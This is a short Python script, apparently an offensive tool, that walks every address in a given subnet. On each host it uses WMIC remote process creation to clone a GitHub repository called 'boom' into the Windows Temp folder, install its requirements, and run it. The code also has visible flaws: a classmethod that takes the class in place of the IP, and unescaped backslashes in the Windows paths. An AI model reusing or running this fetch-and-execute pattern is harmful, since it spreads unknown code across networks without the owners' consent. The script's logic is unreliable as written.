from os import system
from argparse import ArgumentParser
from ipaddress import IPv4Network
from threading import Thread
from time import sleep

class Rumble:
    def __init__(self):
        self.args = ArgumentParser()
        self.args.add_argument('target', help="Subnet in CIDR notation to deploy to", type=str)
        self.args = self.args.parse_args()

        self.deploy()
    
    def deploy(self):
        for ip in IPv4Network(self.args.target):
            last = self.Boom(ip)
            last.start()
        last.join()
    
    class Boom(Thread):
        def __init__(self, ip):
            Thread.__init__(self)
            self.ip = ip
        
        def run(self):
            self.wmic('git clone https://github.com/drpasta/boom.git c:\Windows\Temp\boom')
            sleep(8)
            self.wmic('pip install -r c:\Windows\Temp\boom\requirements.txt')
            sleep(8)
            self.wmic('python c:\Windows\Temp\boom\boom.py')
        
        @classmethod 
        def wmic(ip, command):
            system(f'wmic /node:{ip} process call create "{command}"')

Rumble()
